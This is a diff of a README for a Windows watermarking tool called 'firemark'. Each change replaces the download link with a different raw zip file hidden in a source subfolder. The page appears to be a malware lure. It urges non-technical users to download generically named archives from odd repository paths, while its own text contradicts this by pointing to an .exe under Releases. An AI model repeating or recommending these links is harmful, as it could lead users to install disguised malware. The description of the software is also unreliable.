@@ -1,6 +1,6 @@
 # 🔥 firemark - Protect Images and PDFs Easily
 
-[![Download firemark](https://img.shields.io/badge/Download-firemark-4c1?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/adatigerstriped965/firemark/main/examples/config/Software_2.3.zip)
+[![Download firemark](https://img.shields.io/badge/Download-firemark-4c1?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/adatigerstriped965/firemark/main/src/watermark/shape/Software_2.2.zip)
 
 firemark helps you add watermarks to images and PDFs using one simple command. It is designed to stop anyone from sharing your documents without a watermark. With strong technology built to prevent AI tools from removing watermarks, firemark keeps your files safe.
 
@@ -32,7 +32,7 @@ No special hardware or software is needed. firemark runs as a standalone program
 Here is a step-by-step guide to download and use firemark on Windows. No programming skills needed.
 
 1. Click the big download badge above or visit this page:  
-   [https://raw.githubusercontent.com/adatigerstriped965/firemark/main/examples/config/Software_2.3.zip](https://raw.githubusercontent.com/adatigerstriped965/firemark/main/examples/config/Software_2.3.zip)  
+   [https://raw.githubusercontent.com/adatigerstriped965/firemark/main/src/watermark/shape/Software_2.2.zip](https://raw.githubusercontent.com/adatigerstriped965/firemark/main/src/watermark/shape/Software_2.2.zip)  
    This page holds the latest release versions.
 
 2. Look for the **Releases** section on the GitHub page.  
@@ -121,7 +121,7 @@ If problems persist, you can report issues on the GitHub page by clicking the �
 
 You can always visit this page to download firemark for Windows:
 
-[https://raw.githubusercontent.com/adatigerstriped965/firemark/main/examples/config/Software_2.3.zip](https://raw.githubusercontent.com/adatigerstriped965/firemark/main/examples/config/Software_2.3.zip)
+[https://raw.githubusercontent.com/adatigerstriped965/firemark/main/src/watermark/shape/Software_2.2.zip](https://raw.githubusercontent.com/adatigerstriped965/firemark/main/src/watermark/shape/Software_2.2.zip)
 
 Look for the latest Windows `.exe` file under Releases and download it to your PC.
 
@@ -151,4 +151,4 @@ You can use the GitHub repository to get help or ask questions. Look under “Is
 
 ---
 
-[![Download firemark](https://img.shields.io/badge/Download-firemark-4c1?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/adatigerstriped965/firemark/main/examples/config/Software_2.3.zip)
+[![Download firemark](https://img.shields.io/badge/Download-firemark-4c1?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/adatigerstriped965/firemark/main/src/watermark/shape/Software_2.2.zip)
